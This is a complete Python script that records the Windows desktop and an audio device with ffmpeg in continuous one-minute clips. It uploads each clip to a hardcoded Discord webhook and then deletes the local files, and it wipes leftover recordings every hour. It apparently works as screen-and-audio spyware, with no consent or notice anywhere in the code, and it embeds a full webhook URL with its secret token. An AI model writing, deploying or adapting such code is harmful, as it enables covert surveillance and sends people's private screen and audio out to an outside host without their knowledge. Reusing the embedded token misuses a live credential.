import os
import time
import threading
import requests
import subprocess
import glob
import logging
from pathlib import Path

# Configuration
script_dir = Path(__file__).resolve().parent
ffmpeg_path = Path('C:\\ffmpeg\\bin\\ffmpeg.exe')
webhook_url = 'https://discord.com/api/webhooks/1246738691519676478/k2sl3zBuq3nQHcbHTg7oZTNW-YZFSSzguShau1-zi3w_tYnIgIO5er4fyUfjZO1Sm5i7'
clear_interval = 3600  # Clear old files every hour
video_duration = 60  # Duration of each screen recording

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

previous_video_filename = None

def get_screen_resolution():
    # Return fixed resolution of 1280x720 for performance reasons
    return "1280x720"

def clear_old_files():
    while True:
        for file in glob.glob(str(script_dir / '*.mp4')) + glob.glob(str(script_dir / '*.txt')):
            try:
                os.remove(file)
                logger.info(f"Deleted old file: {file}")
            except Exception as e:
                logger.error(f"Failed to delete {file}: {e}")
        time.sleep(clear_interval)

def record_screen(duration, output_file):
    resolution = get_screen_resolution()
    audio_device = "Line 1 (Virtual Audio Cable)"  # Change this to your actual audio device name
    command = [
        str(ffmpeg_path), '-y', '-f', 'gdigrab', '-framerate', '15', '-i', 'desktop',
        '-f', 'dshow', '-i', f'audio={audio_device}',  # Using the detected audio device
        '-s', resolution, '-t', str(duration), 
        '-c:v', 'libx264', '-preset', 'fast', '-b:v', '2000k',  # Lower bitrate for smaller file size
        '-c:a', 'aac', '-b:a', '128k',  # Lower audio bitrate
        '-pix_fmt', 'yuv420p',  # Ensure compatibility
        output_file
    ]
    try:
        subprocess.run(command, capture_output=True, text=True, check=True)
    except FileNotFoundError:
        logger.error("ffmpeg not found. Please ensure ffmpeg is installed and available in your PATH.")
    except subprocess.CalledProcessError as e:
        logger.error(f"ffmpeg command failed: {e}")

def send_to_discord(file_path, webhook_url, retries=3, backoff_factor=2):
    attempt = 0
    while attempt < retries:
        try:
            with open(file_path, 'rb') as file:
                files = {'file': (os.path.basename(file_path), file.read(), 'video/mp4')}
                response = requests.post(webhook_url, files=files)
                response.raise_for_status()
            logger.info("Upload successful.")
            delete_file(file_path)
            return True
        except requests.RequestException as e:
            attempt += 1
            logger.error(f"Failed to send file to Discord (attempt {attempt}/{retries}): {e}")
            time.sleep(backoff_factor ** attempt)  # Exponential backoff
    return False

def delete_file(file_path):
    try:
        if os.path.exists(file_path):
            os.remove(file_path)
            logger.info(f"File {file_path} deleted successfully.")
    except Exception as e:
        logger.error(f"Failed to delete file {file_path}: {e}")

def capture_and_send_videos():
    global previous_video_filename
    while True:
        video_filename = script_dir / f"screenrecord-{int(time.time())}.mp4"
        
        # Start recording the next video
        record_thread = threading.Thread(target=record_screen, args=(video_duration, str(video_filename)))
        record_thread.start()
        
        # Start uploading the previous video if it exists
        if previous_video_filename:
            upload_thread = threading.Thread(target=send_to_discord, args=(str(previous_video_filename), webhook_url))
            upload_thread.start()
        
        # Wait for the current recording to finish
        record_thread.join()
        
        # Set the current video as the previous video for the next loop
        previous_video_filename = video_filename

# Start background threads
threading.Thread(target=clear_old_files, daemon=True).start()
threading.Thread(target=capture_and_send_videos, daemon=True).start()

# Keep the main thread alive
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    logger.info("Script terminated by user.")
